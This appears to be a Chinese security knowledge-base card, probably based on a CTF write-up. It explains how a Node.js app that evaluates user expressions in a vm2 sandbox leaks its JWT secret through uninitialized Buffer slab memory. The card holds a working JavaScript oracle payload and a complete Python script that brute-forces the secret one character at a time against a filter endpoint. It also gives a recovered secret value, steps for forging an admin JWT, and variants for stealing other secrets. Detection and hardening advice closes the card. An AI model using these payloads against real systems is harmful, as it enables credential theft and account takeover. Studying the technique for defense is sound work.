---
id: web-nodejs-vm2-buffer-slab-jwt-secret-leak
title: vm2 沙箱内 Buffer slab 未初始化内存泄漏：布尔 oracle 逐位提取 JWT secret
type: scenario
domain: web
path: web/nodejs
technique: vm2-buffer-slab-uninitialized-memory-jwt-secret-oracle
tags:
- nodejs
- vm2
- sandbox
- buffer
- memory-leak
- jwt
- secret
- oracle
- expression-injection
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V127
  verified_at: '2026-11-06T04:28:39+08:00'
  notes: 已对照原文与图03-06核对：Dynamic Filter 的 expression 进入 vm2 VM({timeout,sandbox:{item}}) 求值、Buffer 可用、Buffer.from(x.buffer).toString('latin1') 取 slab、正则 aaa26_[0-9a-f]{48}、startsWith 前缀 oracle 48×16 得 secret aaa26_55b9e9436e470905f2d534d418d297b3e85103d55259f653、伪造 admin JWT，均与卡片一致。未验证点：PoC 未本机复跑；CTF 无组件版本；frontmatter 无 sources/source_url。
url: /docs/web/nodejs/web-nodejs-vm2-buffer-slab-jwt-secret-leak/
draft: false
kb_aliases:
- Buffer slab 泄漏
- allocUnsafe 未初始化内存
- x.buffer 整块 slab
- JWT secret 逐位爆破
- vm2 表达式沙箱内存泄露
---

## 一句话结论

Node.js 应用把用户可控的 JavaScript 表达式放进 vm2 沙箱求值并回显布尔结果时，沙箱默认暴露 `Buffer`；用 `Buffer.from(x.buffer)` 取出小 Buffer 背后的整块 8KB slab，再配合 `toString('latin1')` 与正则前缀判断，就能把进程内存里残留的 JWT secret 逐位爆破出来，进而伪造任意身份令牌。

## 原理

- Node.js 为性能使用 Buffer 内存池（slab，常见 8KB）：`Buffer.from('X')` 这类小 Buffer 只从池中切一小片视图，底层 `x.buffer` 是一整块更大的 `ArrayBuffer`。
- `Buffer.allocUnsafe(n)` 以及池化分配不会清零，返回的是之前对象释放后的旧内存；JWT 校验、签名、配置读取等操作会在同一进程堆中留下 secret、token、密钥等字符串。
- 把底层整块内存重新包成 Buffer 并转字符串即可“扫”整块 slab：
  ```js
  const x = Buffer.from('X');
  const s = Buffer.from(x.buffer).toString('latin1');
  ```
  `latin1` 一字节对应一字符，适合把脏内存粗暴转成可正则匹配的字符串。
- 应用把表达式结果 `Boolean(...)` 回显（如过滤接口返回 `ok/count`），于是“内存中是否存在以某前缀开头的 secret”变成布尔 oracle。对已知格式 `aaa26_[0-9a-f]{48}`，先 `match` 出所有候选，再用 `startsWith(prefix)` 逐位判断，48×16 次请求即可还原完整 secret。
- 关键在于：这不是 vm2 逃逸到 RCE，而是沙箱内可用的宿主 `Buffer` 造成的未初始化内存泄露；secret 恰好与本次请求的 JWT 校验在同一进程，残留概率高。

## 触发条件

- 应用执行用户可控 JS 表达式（vm2、原生 vm 或类似表达式引擎），且沙箱内 `Buffer` 可用。
- 表达式结果可被观察（布尔、计数、错误、时间差）。
- 目标进程内存中存在格式已知的敏感串（JWT secret、API key、数据库口令），且攻击者可高频请求。
- 表达式长度/字符集限制允许写入多行 IIFE 与正则（常见上限 4096 字节足够）。

## 利用步骤

1. 确认沙箱能力：提交 `typeof Buffer !== 'undefined'`，返回 true 说明 Buffer 可用。
2. 确认能读到底层 slab：`Buffer.from(Buffer.from('X').buffer).toString('latin1')` 非空。
3. 从源码/配置推断 secret 形状（如 `aaa26_` + 48 位十六进制），构造正则 `/<prefix>_[0-9a-f]{48}/`。
4. 构造前缀 oracle：取 slab 字符串中所有匹配候选，判断是否有候选以当前猜测前缀开头。
5. 逐位爆破：每位尝试字符集，命中即固定，继续下一位；48 位十六进制约 768 次请求。
6. 用还原出的 secret 以 HS256 签发伪造 JWT（`role: admin`、合法 ObjectId 形式的 `id`、合理 `iat/exp`），替换 Cookie 取得管理员权限。
7. 若 secret 格式未知，可先用正则粗匹配高熵串、逐段泄露长度/字符集，或直接搜索 `process.env` 中其他秘密。

## PoC

表达式（提交到执行过滤/搜索的接口）：

```js
(() => {
  let p = "aaa26_";
  let x = Buffer.from('X');
  let s = Buffer.from(x.buffer).toString('latin1');
  let m = s.match(/aaa26_[0-9a-f]{48}/g) || [];
  for (let i = 0; i < m.length; i++) {
    if (m[i].startsWith(p)) return true;
  }
  return false;
})()
```

爆破脚本（接口返回 `{ok, count}`，`count>0` 视为命中）：

```python
import requests
s = requests.Session()
s.cookies.set("token", "<reviewer JWT>")

def hit(expr):
    r = s.post("http://target/api/reviewer/filter", json={"expression": expr})
    d = r.json()
    return d["ok"] and d["count"] > 0

def oracle(prefix):
    return hit(f"""(() => {{
      let p = "{prefix}";
      let x = Buffer.from('X');
      let s = Buffer.from(x.buffer).toString('latin1');
      let m = s.match(/aaa26_[0-9a-f]{{48}}/g) || [];
      for (let i = 0; i < m.length; i++) if (m[i].startsWith(p)) return true;
      return false;
    }})()""")

prefix = "aaa26_"
for _ in range(48):
    for c in "0123456789abcdef":
        if oracle(prefix + c):
            prefix += c
            break
print(prefix)
```

说明：PoC 为原文流程的结构化复现，未在本机执行；仅用于授权测试。

## 变体与关联

- 变体（分配方式）：`Buffer.allocUnsafe(n)`、`Buffer.concat`、`new Uint8Array` 等也可触发未初始化内存读取；`x.buffer` 直接拿整块 slab 比逐次 `allocUnsafe` 稳定。
- 变体（目标）：可搜索任意已知格式秘密（云 AK、数据库连接串、session 密钥、其他用户 token）；也可用字符集/长度 oracle 处理未知格式。
- 变体（更强原语）：若沙箱还暴露 `process`、`require` 或存在 vm2 逃逸，可直接读环境变量或执行命令，见 [[web-nodejs-n8n-expression-sandbox-escape-rce]]、[[binary-pwn-sandbox-escape-nodejs-vm-constructor-constructor]]。
- 关联：[[web-nodejs-mongodb-json-operator-injection-prefix-oracle]]（同链前置：先拿到 reviewer 身份才能访问表达式接口）；[[web-generic-jwt-weak-hmac-key-bruteforce]]（拿到 secret 后的令牌伪造）。
- 边界：沙箱移除 Buffer、每次求值使用全新进程/隔离上下文、secret 不驻留进程内存、或结果完全不可观察时，本手法不成立。

## 检测与防御

- 检测：表达式/过滤请求中出现 `Buffer`、`allocUnsafe`、`.buffer`、`toString('latin1')`、`match(`、`startsWith(` 等特征；同一账号对过滤接口的高频、逐字符递增请求。
- 防御：不要执行用户可控 JS；确需表达式能力时使用白名单 DSL，而非通用 JS 引擎。
- 加固：在独立进程/容器中求值，进程内不加载 JWT secret 等秘密；每次求值使用全新 worker 并禁用 `Buffer`、`TypedArray`、`SharedArrayBuffer`。
- 加固：JWT 改用非对称签名，私钥只存在于签发服务，验证端仅持有公钥；定期轮换密钥；对敏感接口限速并监控异常表达式。
